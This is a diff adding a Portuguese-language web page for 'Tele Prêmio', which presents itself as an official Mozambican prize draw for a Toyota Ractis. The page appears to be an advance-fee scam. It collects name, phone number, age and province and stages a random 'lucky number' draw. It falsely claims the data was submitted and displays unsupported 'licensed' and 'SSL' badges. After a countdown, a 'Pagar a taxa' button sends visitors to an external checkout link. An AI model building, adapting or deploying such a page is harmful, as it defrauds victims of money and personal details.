@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Tele Prêmio — Ganhe um Toyota Ractis + 25.000 MT</title>
+  <meta name="description" content="Cadastro no sorteio Tele Prêmio em 4 etapas simples."/>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
+  <style>
+    body { font-family: 'Inter', sans-serif; }
+    :root { --navy-deep: #0b132b; --cream: #fdfaf6; --cream-strong: #f5efe4; --gold: #d4af37; --radius: 0.75rem; }
+    .step-circle { width: 2.5rem; height: 2.5rem; border-radius: 9999px; display: grid; place-items: center; font-weight: 800; font-size: 0.875rem; border: 2px solid; transition: all 0.3s ease; }
+    .step-active { background: var(--gold); color: var(--navy-deep); border-color: var(--gold); box-shadow: 0 0 0 4px rgba(212, 175, 55, 0.3); }
+    .step-done { background: var(--navy-deep); color: #fff; border-color: var(--navy-deep); }
+    .step-pending { background: transparent; color: #94a3b8; border-color: #e2e8f0; }
+    .progress-line { height: 3px; border-radius: 999px; transition: width 0.5s ease; }
+    .fade-in { animation: fadeIn 0.4s ease forwards; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+  </style>
+</head>
+<body class="bg-cream text-navy-deep min-h-screen flex flex-col">
+
+  <!-- Header -->
+  <header class="bg-navy-deep text-navy-deep text-sm border-b border-white/5">
+    <div class="max-w-6xl mx-auto px-4 py-3 flex flex-wrap items-center justify-between gap-3">
+      <div class="flex flex-wrap items-center gap-5">
+        <div class="inline-flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-phone h-4 w-4"><path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"></path></svg><span>(+258) 206 062 90</span></div>
+        <div class="inline-flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-mail h-4 w-4"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"></path><rect x="2" y="4" width="20" height="16" rx="2"></rect></svg><span>suporte@telepremio.co.mz</span></div>
+      </div>
+      <div class="bg-gold text-navy-deep rounded-md px-4 py-2 flex items-center gap-3 shadow-sm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-trophy h-5 w-5"><path d="M10 14.66v1.626a2 2 0 0 1-.976 1.696A5 5 0 0 0 7 21.978"></path><path d="M14 14.66v1.626a2 2 0 0 0 .976 1.696A5 5 0 0 1 17 21.978"></path><path d="M18 9h1.5a1 1 0 0 0 0-5H18"></path><path d="M4 22h16"></path><path d="M6 9a6 6 0 0 0 12 0V3a1 1 0 0 0-1-1H7a1 1 0 0 0-1 1z"></path><path d="M6 9H4.5a1 1 0 0 1 0-5H6"></path></svg><div class="leading-tight text-right"><div class="text-[10px] uppercase tracking-wider opacity-80">Prêmio principal</div><div class="text-sm font-extrabold">Toyota Ractis + 25.000 MT</div></div></div>
+    </div>
+  </header>
+
+  <!-- Nav -->
+  <nav class="bg-navy-deep text-navy-deep border-t border-white/5">
+    <div class="max-w-6xl mx-auto px-4 py-4 flex items-center justify-between gap-4">
+      <div class="flex items-center gap-3">
+        <div class="bg-gold text-navy-deep rounded-lg h-11 w-11 grid place-items-center text-[10px] font-extrabold leading-tight text-center">TELE<br>PRÊMIO</div>
+        <div class="leading-tight"><div class="font-extrabold tracking-tight text-lg">TELE PRÊMIO</div><div class="text-[10px] uppercase tracking-widest opacity-60">Sorteios oficiais de Moçambique</div></div>
+      </div>
+      <div class="bg-navy-deep border border-gold/60 rounded-lg px-3 py-2 flex items-center gap-3 shadow-sm">
+        <div class="leading-tight text-right"><div class="text-[9px] uppercase tracking-widest opacity-60">Parceria</div><div class="text-sm font-bold text-gold">TV SUCESSO</div></div>
+        <div class="bg-gold text-navy-deep rounded-md h-8 w-8 grid place-items-center"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tv h-4 w-4"><path d="m17 2-5 5-5-5"></path><rect width="20" height="15" x="2" y="7" rx="2"></rect></svg></div>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Progress steps -->
+  <section class="bg-cream border-b border-black/5 py-6">
+    <div class="max-w-3xl mx-auto px-4">
+      <div class="flex items-center justify-between">
+        <div class="flex flex-col items-center gap-2 min-w-[64px]"><div class="step-circle step-done" id="c1">1</div><div class="text-[11px] uppercase tracking-wider font-semibold">Cadastro</div></div>
+        <div class="flex-1 h-[3px] mx-2 rounded bg-black/10"><div class="progress-line bg-gold h-full" id="p1"></div></div>
+        <div class="flex flex-col items-center gap-2 min-w-[64px]"><div class="step-circle step-pending" id="c2">2</div><div class="text-[11px] uppercase tracking-wider font-semibold opacity-60">Sorteio</div></div>
+        <div class="flex-1 h-[3px] mx-2 rounded bg-black/10"><div class="progress-line bg-gold h-full" id="p2"></div></div>
+        <div class="flex flex-col items-center gap-2 min-w-[64px]"><div class="step-circle step-pending" id="c3">3</div><div class="text-[11px] uppercase tracking-wider font-semibold opacity-60">Dados</div></div>
+        <div class="flex-1 h-[3px] mx-2 rounded bg-black/10"><div class="progress-line bg-gold h-full" id="p3"></div></div>
+        <div class="flex flex-col items-center gap-2 min-w-[64px]"><div class="step-circle step-pending" id="c4">4</div><div class="text-[11px] uppercase tracking-wider font-semibold opacity-60">Concluir</div></div>
+      </div>
+      <div class="mt-4 text-center"><span class="font-bold" id="step-label">Etapa 1 de 4</span><span class="ml-2 text-xs opacity-60 uppercase tracking-wider" id="step-sub">Preencha seus dados para continuar</span></div>
+    </div>
+  </section>
+
+  <!-- Steps content -->
+  <main class="flex-1 max-w-3xl w-full mx-auto px-4 py-8">
+
+    <!-- STEP 1: Cadastro -->
+    <section id="s1" class="fade-in">
+      <div class="bg-white/80 backdrop-blur rounded-2xl shadow-sm border border-black/5 p-6 md:p-7">
+        <h2 class="text-2xl md:text-3xl font-extrabold text-center mb-6">Cadastro no Sorteio</h2>
+        <form id="f1" class="space-y-4" onsubmit="return nextStep(1)">
+          <div><label class="flex items-center gap-2 font-bold mb-2"><span class="opacity-70"><svg class="lucide lucide-user h-4 w-4"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></span> Nome Completo</label><input type="text" id="nome" placeholder="Digite seu nome completo" required class="input w-full"/></div>
+          <div><label class="flex items-center gap-2 font-bold mb-2"><span class="opacity-70"><svg class="lucide lucide-phone h-4 w-4"><path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"></path></svg></span> Número de Celular</label><input type="tel" id="celular" placeholder="Ex: 84 123 4567" required class="input w-full"/></div>
+          <button type="submit" class="w-full h-14 rounded-lg font-bold text-white transition bg-gold text-navy-deep hover:bg-[#c5a22e] active:scale-95 shadow-md">Próximo &rarr;</button>
+        </form>
+      </div>
+    </section>
+
+    <!-- STEP 2: Sorteio -->
+    <section id="s2" class="hidden fade-in">
+      <div class="bg-white/80 backdrop-blur rounded-2xl shadow-sm border border-black/5 p-6 md:p-7 text-center">
+        <div class="w-16 h-16 rounded-full bg-gold text-navy-deep flex items-center justify-center mx-auto mb-4 text-2xl font-bold">🎲</div>
+        <h2 class="text-2xl md:text-3xl font-extrabold mb-3">Sorteio da Sorte</h2>
+        <p class="text-navy-deep/70 mb-4">Escolha um número de 1 a 1000 para concorrer ao Toyota Ractis.</p>
+
+        <!-- Alerta de tentativas -->
+        <div id="alerta-tentativas" class="bg-amber-50 border border-amber-200 rounded-lg p-3 mb-4 hidden">
+          <div class="flex items-center gap-2"><svg class="lucide lucide-alert-triangle h-5 w-5 text-amber-600"><path d="M21.73 18.1l-1.59-7.69c-.32-1.53-1.9-2.81-3.5-2.81H6.86c-1.6 0-3.18 1.28-3.5 2.81L1.43 18.1c-.32 1.53.55 3.17 1.9 3.6l7.14 1.18c1.21.19 2.47-.18 2.87-1.07l1.84-3.63 1.84 3.63c.41.89 1.66 1.26 2.87 1.07l7.14-1.18c1.35-.43 2.22-2.07 1.9-3.6Z"/><line x1="12" x2="12" y1="9" y2="13"/></svg><span class="text-sm font-semibold text-amber-800" id="texto-alerta">Você tem apenas 3 tentativas!</span></div>
+        </div>
+
+        <!-- Input número da sorte -->
+        <div class="mb-4">
+          <label class="block text-sm font-bold text-navy-deep mb-1">Número da Sorte (1 - 1000)</label>
+          <input type="number" id="numero-sorte" min="1" max="1000" placeholder="Digite seu número" class="input w-full max-w-md mx-auto"/>
+        </div>
+        <p id="contador-tentativa" class="text-sm text-navy-deep/60 mb-4">Tentativa <span id="num-tentativa">1</span> de 3</p>
+
+        <!-- Botão sortear -->
+        <button id="btn-sortear" class="w-full max-w-md mx-auto h-14 rounded-lg font-bold text-white transition bg-gold text-navy-deep hover:bg-[#c5a22e] active:scale-95 shadow-md mb-4">
+          Sortear Agora 🎰
+        </button>
+
+        <!-- Resultado do sorteio (aparece após clicar) -->
+        <div id="resultado-sorteio" class="hidden mb-6">
+          <div class="flex justify-center items-center gap-6 mb-4">
+            <div class="text-center">
+              <div class="text-xs text-navy-deep/60 uppercase tracking-wider">Seu Número</div>
+              <div class="text-4xl font-bold text-navy-deep" id="seu-numero">—</div>
+            </div>
+            <div class="w-px h-16 bg-black/10 mx-2"></div>
+            <div class="text-center">
+              <div class="text-xs text-navy-deep/60 uppercase tracking-wider">Número Sorteado</div>
+              <div class="text-4xl font-bold text-navy-deep" id="numero-sorteado">—</div>
+            </div>
+          </div>
+          <p id="mensagem-resultado" class="text-lg font-bold text-navy-deep mb-4"></p>
+          <p id="tentativas-restantes" class="text-sm text-navy-deep/60 mb-4"></p>
+          <div class="flex justify-center gap-3">
+            <button id="btn-tentar-novamente" class="h-12 rounded-lg font-bold text-white transition bg-red-600 hover:bg-red-700 active:scale-95 shadow-md hidden px-4">Tentar Novamente</button>
+            <button id="btn-proximo-sorteio" class="h-12 rounded-lg font-bold text-white transition bg-gold text-navy-deep hover:bg-[#c5a22e] active:scale-95 shadow-md hidden px-4">Próximo &rarr;</button>
+          </div>
+        </div>
+
+        <div class="flex justify-between mt-6">
+          <button type="button" onclick="prevStep(2)" class="h-14 rounded-lg font-bold text-navy-deep transition bg-white border border-black/10 hover:bg-black/5">Voltar</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- STEP 3: Dados -->
+    <section id="s3" class="hidden fade-in">
+      <div class="bg-white/80 backdrop-blur rounded-2xl shadow-sm border border-black/5 p-6 md:p-7">
+        <h2 class="text-2xl md:text-3xl font-extrabold text-center mb-6">Confirme seus dados</h2>
+        <form id="f3" class="space-y-4" onsubmit="return nextStep(3)">
+          <div><label class="flex items-center gap-2 font-bold mb-2"><span class="opacity-70"><svg class="lucide lucide-calendar h-4 w-4"><path d="M8 2v4"></path><path d="M16 2v4"></path><rect width="18" height="18" x="3" y="4" rx="2"></rect><path d="M3 10h18"></path></svg></span> Idade</label><input type="number" id="idade" placeholder="Sua idade" min="18" required class="input w-full"/></div>
+          <div><label class="flex items-center gap-2 font-bold mb-2"><span class="opacity-70"><svg class="lucide lucide-map-pin h-4 w-4"><path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"></path><circle cx="12" cy="10" r="3"></circle></svg></span> Província</label><select id="provincia" required class="input w-full"><option value="" selected disabled>Selecione uma província</option><option>Maputo</option><option>Matola</option><option>Gaza</option><option>Inhambane</option><option>Sofala</option><option>Manica</option><option>Tete</option><option>Zambézia</option><option>Nampula</option><option>Cabo Delgado</option><option>Niassa</option></select></div>
+          <div class="flex justify-between">
+            <button type="button" onclick="prevStep(3)" class="h-14 rounded-lg font-bold text-navy-deep transition bg-white border border-black/10 hover:bg-black/5">Voltar</button>
+            <button type="submit" class="h-14 rounded-lg font-bold text-white transition bg-gold text-navy-deep hover:bg-[#c5a22e] active:scale-95 shadow-md">Próximo &rarr;</button>
+          </div>
+        </form>
+      </div>
+    </section>
+
+    <!-- STEP 4: Concluir -->
+    <section id="s4" class="hidden fade-in">
+      <div class="bg-white/80 backdrop-blur rounded-2xl shadow-sm border border-black/5 p-6 md:p-7 text-center">
+        <div class="w-16 h-16 rounded-full bg-gold text-navy-deep flex items-center justify-center mx-auto mb-4 text-2xl font-bold">&#10003;</div>
+        <h2 class="text-2xl md:text-3xl font-extrabold mb-3">Cadastro concluído!</h2>
+        <p class="text-navy-deep/70 mb-6">Seus dados foram enviados com sucesso. Boa sorte no sorteio do Toyota Ractis + 25.000 MT.</p>
+        <div class="rounded-2xl shadow-xl overflow-hidden border border-black/5 bg-black aspect-video max-w-[560px] mx-auto">
+          <vturb-smartplayer id="vid-6aee16b3526a2ed90e962398" style="display: block; width: 100%; height: 100%;"><div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 55.625% 0 0; z-index: 0; background-color: black;"></div></vturb-smartplayer>
+        </div>
+        <script>var s=document.createElement("script");s.src="https://scripts.converteai.net/e984ae4f-723b-4a7e-8098-ad701a5746ff/players/6aee16b3526a2ed90e962398/v4/player.js";s.async=!0;document.head.appendChild(s);</script>
+        <p class="text-[10px] uppercase tracking-wider text-navy-deep/60 mt-4">Assista ao sorteio oficial Tele Prêmio × TV Sucesso.</p>
+        <p id="taxa-contador" class="text-sm font-bold text-navy-deep mt-4 hidden">Pagar a taxa disponível em <span id="taxa-tempo">2:42</span></p>
+        <button id="btn-taxa" disabled class="mt-6 inline-block px-8 py-3 rounded-lg font-bold text-white transition bg-gray-400 cursor-not-allowed shadow-md hidden">Pagar a taxa &rarr;</button>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Footer -->
+  <footer class="bg-navy-deep text-navy-deep mt-10 border-t border-white/10">
+    <div class="max-w-6xl mx-auto px-4 py-6">
+      <div class="rounded-lg bg-white/5 px-4 py-3 flex items-center justify-center gap-3 text-sm">
+        <div class="bg-gold text-navy-deep rounded h-8 w-8 grid place-items-center text-[9px] font-extrabold leading-tight text-center">TELE<br>PRÊMIO</div>
+        <div><div class="font-bold text-gold text-xs tracking-wide">PARCERIA OFICIAL 2026</div><div class="text-xs opacity-80">Tele Prêmio × TV Sucesso</div></div>
+        <div class="bg-gold text-navy-deep rounded h-8 w-8 grid place-items-center"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tv h-4 w-4"><path d="m17 2-5 5-5-5"></path><rect width="20" height="15" x="2" y="7" rx="2"></rect></svg></div>
+      </div>
+      <div class="border-t border-white/10 mt-8">
+        <div class="max-w-6xl mx-auto px-4 py-8 grid gap-8 md:grid-cols-3 text-sm">
+          <div><div class="font-bold mb-3">Suporte</div><div class="flex items-center gap-2 opacity-90"><svg class="lucide lucide-phone h-4 w-4"><path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384"></path></svg> <span>(+258) 206 062 90</span></div><div class="flex items-center gap-2 opacity-90 mt-1"><svg class="lucide lucide-mail h-4 w-4"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"></path><rect x="2" y="4" width="20" height="16" rx="2"></rect></svg> suporte@telepremio.co.mz</div></div>
+          <div><div class="font-bold mb-3">Segurança</div><div class="flex items-center gap-2 opacity-90"><svg class="lucide lucide-circle-check h-4 w-4"><circle cx="12" cy="12" r="10"></circle><path d="m9 12 2 2 4-4"></path></svg> Sorteios Licenciados</div><div class="flex items-center gap-2 opacity-90 mt-1"><svg class="lucide lucide-circle-check h-4 w-4"><circle cx="12" cy="12" r="10"></circle><path d="m9 12 2 2 4-4"></path></svg> Certificado SSL</div></div>
+          <div><div class="font-bold mb-3">Sobre Nós</div><p class="opacity-90">Plataforma oficial de sorteios em Moçambique em parceria com <span class="text-gold font-semibold">TV SUCESSO</span>.</p></div>
+        </div>
+        <div class="text-center text-xs opacity-70 py-4 border-t border-white/10">© 2026 TELE PRÊMIO. Jogue com responsabilidade.</div>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    const steps = ['s1','s2','s3','s4'];
+    const circles = ['c1','c2','c3','c4'];
+    const progress = ['p1','p2','p3'];
+    let current = 1;
+
+    function showStep(n) {
+      steps.forEach((id, i) => document.getElementById(id).classList.toggle('hidden', i + 1 !== n));
+      circles.forEach((id, i) => {
+        const c = document.getElementById(id);
+        c.className = 'step-circle ' + (i + 1 < n ? 'step-done' : (i + 1 === n ? 'step-active' : 'step-pending'));
+      });
+      progress.forEach((id, i) => { document.getElementById(id).style.width = (i < n - 1 ? '100%' : '0%'); });
+      document.getElementById('step-label').textContent = 'Etapa ' + n + ' de 4';
+      document.getElementById('step-sub').textContent = n===1?'Preencha seus dados para continuar':(n===2?'Acompanhe o sorteio ao vivo':(n===3?'Confirme seus dados para receber o prêmio':'Assista ao sorteio e pague a taxa'));
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      current = n;
+    }
+
+    function nextStep(step) {
+      if (step === 1 || step === 3) {
+        const form = document.getElementById('f' + step);
+        if (!form.checkValidity()) { form.reportValidity(); return false; }
+      }
+      if (step < 4) showStep(step + 1);
+      return false;
+    }
+
+    function prevStep(step) { showStep(step - 1); }
+
+    showStep(1);
+
+    /* Botão "Pagar a taxa" após 2:42 (162s) na etapa 4 */
+    const TAXA_SEGUNDOS = 162;
+    let taxaRestante = TAXA_SEGUNDOS;
+    const btnTaxa = document.getElementById('btn-taxa');
+    const contadorTaxa = document.getElementById('taxa-contador');
+    const tempoTaxa = document.getElementById('taxa-tempo');
+    const CHECKOUT_URL = "https://mozquantumpay-original.onrender.com/checkout/ef8a8df1-d948-482e-a6bd-3178dd51afef";
+
+    function atualizarContadorTaxa() {
+      const m = Math.floor(taxaRestante / 60).toString().padStart(2, '0');
+      const s = (taxaRestante % 60).toString().padStart(2, '0');
+      tempoTaxa.textContent = m + ':' + s;
+      if (taxaRestante <= 0) {
+        contadorTaxa.classList.add('hidden');
+        btnTaxa.classList.remove('hidden');
+        btnTaxa.disabled = false;
+        btnTaxa.classList.replace('bg-gray-400', 'bg-navy-deep');
+        btnTaxa.classList.remove('cursor-not-allowed');
+        btnTaxa.classList.add('hover:bg-[#0a0c1c]');
+        return;
+      }
+      taxaRestante--;
+    }
+
+    btnTaxa.addEventListener('click', function () { window.location.href = CHECKOUT_URL; });
+
+    const _showStep = showStep;
+    showStep = function (n) {
+      _showStep(n);
+      if (n === 4) {
+        taxaRestante = TAXA_SEGUNDOS;
+        contadorTaxa.classList.remove('hidden');
+        btnTaxa.classList.add('hidden');
+        btnTaxa.disabled = true;
+        btnTaxa.classList.replace('bg-navy-deep', 'bg-gray-400');
+        btnTaxa.classList.remove('hover:bg-[#0a0c1c]');
+        btnTaxa.classList.add('cursor-not-allowed');
+        clearInterval(window.taxaInterval);
+        atualizarContadorTaxa();
+        window.taxaInterval = setInterval(atualizarContadorTaxa, 1000);
+      } else {
+        clearInterval(window.taxaInterval);
+      }
+    };
+  </script>
+
+  <script>
+    /* ===== SORTEIO - ETAPA 2 ===== */
+    let tentativaAtual = 1;
+    const MAX_TENTATIVAS = 3;
+    const btnSortear = document.getElementById('btn-sortear');
+    const inputNumero = document.getElementById('numero-sorte');
+    const resultadoDiv = document.getElementById('resultado-sorteio');
+    const seuNumeroEl = document.getElementById('seu-numero');
+    const numeroSorteadoEl = document.getElementById('numero-sorteado');
+    const mensagemResultado = document.getElementById('mensagem-resultado');
+    const tentativasRestantesEl = document.getElementById('tentativas-restantes');
+    const contadorTentativa = document.getElementById('contador-tentativa');
+    const numTentativaEl = document.getElementById('num-tentativa');
+    const btnTentarNovamente = document.getElementById('btn-tentar-novamente');
+    const btnProximoSorteio = document.getElementById('btn-proximo-sorteio');
+    const alertaTentativas = document.getElementById('alerta-tentativas');
+    const textoAlerta = document.getElementById('texto-alerta');
+
+    function resetarSorteio() {
+      tentativaAtual = 1;
+      numTentativaEl.textContent = '1';
+      contadorTentativa.classList.remove('hidden');
+      resultadoDiv.classList.add('hidden');
+      btnTentarNovamente.classList.add('hidden');
+      btnProximoSorteio.classList.add('hidden');
+      btnSortear.disabled = false;
+      inputNumero.disabled = false;
+      inputNumero.value = '';
+      seuNumeroEl.textContent = '—';
+      numeroSorteadoEl.textContent = '—';
+      mensagemResultado.textContent = '';
+      tentativasRestantesEl.textContent = '';
+      alertaTentativas.classList.remove('hidden');
+      textoAlerta.textContent = 'Você tem apenas 3 tentativas!';
+    }
+
+    function simularSorteio() {
+      // Simula roleta girando com números aleatórios rápidos
+      let contagem = 0;
+      const intervalo = setInterval(() => {
+        numeroSorteadoEl.textContent = Math.floor(Math.random() * 1000) + 1;
+        contagem++;
+        if (contagem > 20) {
+          clearInterval(intervalo);
+          finalizarSorteio();
+        }
+      }, 60);
+    }
+
+    function finalizarSorteio() {
+      const numeroEscolhido = parseInt(inputNumero.value);
+      const numeroVencedor = Math.floor(Math.random() * 1000) + 1;
+      seuNumeroEl.textContent = numeroEscolhido;
+      numeroSorteadoEl.textContent = numeroVencedor;
+
+      if (numeroEscolhido === numeroVencedor) {
+        // ACERTOU - 3ª tentativa mostra que ganhou
+        mensagemResultado.textContent = 'PARABÉNS! Você acertou o número da sorte!';
+        mensagemResultado.className = 'text-lg font-bold text-emerald-700 mb-4';
+        tentativasRestantesEl.textContent = '';
+        btnSortear.classList.add('hidden');
+        btnProximoSorteio.classList.remove('hidden');
+        btnProximoSorteio.onclick = function () {
+          showStep(3);
+        };
+      } else {
+        // ERROU
+        tentativaAtual++;
+        const restantes = MAX_TENTATIVAS - tentativaAtual + 1;
+
+        if (restantes > 0) {
+          mensagemResultado.textContent = 'Essa foi por pouco! 😔';
+          mensagemResultado.className = 'text-lg font-bold text-red-700 mb-4';
+          tentativasRestantesEl.textContent = restantes + ' tentativas restantes';
+          numTentativaEl.textContent = tentativaAtual;
+          btnTentarNovamente.classList.remove('hidden');
+          btnTentarNovamente.onclick = function () {
+            btnTentarNovamente.classList.add('hidden');
+            resultadoDiv.classList.add('hidden');
+            btnSortear.disabled = false;
+            inputNumero.disabled = false;
+            inputNumero.value = '';
+            seuNumeroEl.textContent = '—';
+            numeroSorteadoEl.textContent = '—';
+            mensagemResultado.textContent = '';
+            tentativasRestantesEl.textContent = '';
+          };
+        } else {
+          // Esgotou tentativas
+          mensagemResultado.textContent = 'Suas tentativas acabaram. Tente novamente mais tarde.';
+          mensagemResultado.className = 'text-lg font-bold text-red-700 mb-4';
+          tentativasRestantesEl.textContent = '0 tentativas restantes';
+          btnSortear.classList.add('hidden');
+          btnTentarNovamente.classList.remove('hidden');
+          btnTentarNovamente.textContent = 'Reiniciar Sorteio';
+          btnTentarNovamente.onclick = resetarSorteio;
+        }
+      }
+      resultadoDiv.classList.remove('hidden');
+      btnSortear.disabled = true;
+      inputNumero.disabled = true;
+    }
+
+    btnSortear.addEventListener('click', function () {
+      if (!inputNumero.value || parseInt(inputNumero.value) < 1 || parseInt(inputNumero.value) > 1000) {
+        alert('Digite um número entre 1 e 1000.');
+        return;
+      }
+      btnSortear.disabled = true;
+      inputNumero.disabled = true;
+      simularSorteio();
+    });
+
+    // Reinicia quando entra na etapa 2
+    const _showStep2 = showStep;
+    showStep = function (n) {
+      _showStep2(n);
+      if (n === 2) {
+        resetarSorteio();
+      }
+    };
+  </script>
+
+</body>
+</html>
